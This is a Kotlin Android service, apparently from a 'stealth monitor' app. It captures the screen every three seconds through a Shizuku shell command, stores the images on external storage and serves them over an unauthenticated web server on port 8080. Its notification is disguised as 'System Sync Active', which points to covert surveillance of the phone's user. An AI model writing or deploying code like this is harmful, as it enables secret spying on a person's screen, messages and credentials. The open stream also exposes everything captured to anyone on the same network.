package com.stealth.monitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import java.io.File
import java.net.Inet4Address
import java.net.NetworkInterface

class MonitorService : Service() {

    private val channelId = "StealthMonitorChannel"
    private var isMonitoring = false
    private lateinit var monitorDir: File
    private var webServer: MonitorWebServer? = null
    private val handler = Handler(Looper.getMainLooper())
    private var currentIp = "0.0.0.0"

    private val captureRunnable = object : Runnable {
        override fun run() {
            if (isMonitoring) {
                captureScreen()
                handler.postDelayed(this, 3000) // 3 seconds interval
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        monitorDir = File(Environment.getExternalStorageDirectory(), "monitor_cache")
        if (!monitorDir.exists()) monitorDir.mkdirs()

        createNotificationChannel()
        startForeground(1, buildNotification(currentIp))

        setupNetworkCallback()
        startMonitoring()
    }

    private fun captureScreen() {
        try {
            val timestamp = System.currentTimeMillis()
            val path = "${monitorDir.absolutePath}/$timestamp.png"
            
            // Use Java helper to bypass Kotlin compiler bug with Shizuku.newProcess visibility
            val cmd = arrayOf("sh", "-c", "screencap -p $path")
            val process = ShizukuHelper.execute(cmd, null, null)
            process.waitFor()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun startMonitoring() {
        if (isMonitoring) return
        isMonitoring = true

        try {
            webServer = MonitorWebServer(8080, monitorDir)
            webServer!!.start()
        } catch (e: Exception) {
            e.printStackTrace()
        }

        handler.post(captureRunnable)
    }

    private fun setupNetworkCallback() {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val builder = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .addTransportType(NetworkCapabilities.TRANSPORT_CELLULAR)

        cm.registerNetworkCallback(builder.build(), object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                updateIp()
            }
            override fun onLost(network: Network) {
                updateIp()
            }
        })
        updateIp()
    }

    private fun updateIp() {
        currentIp = getLocalIpAddress()
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(1, buildNotification(currentIp))
    }

    private fun getLocalIpAddress(): String {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces() ?: return "0.0.0.0"
            for (intf in interfaces) {
                for (addr in intf.inetAddresses) {
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        return addr.hostAddress ?: "0.0.0.0"
                    }
                }
            }
        } catch (ex: Exception) {}
        return "0.0.0.0"
    }

    private fun buildNotification(ip: String): Notification {
        return Notification.Builder(this, channelId)
            .setContentTitle("System Sync Active")
            .setContentText("View stream: http://$ip:8080")
            .setSmallIcon(android.R.drawable.ic_menu_rotate)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Sync Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        isMonitoring = false
        handler.removeCallbacks(captureRunnable)
        webServer?.stop()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
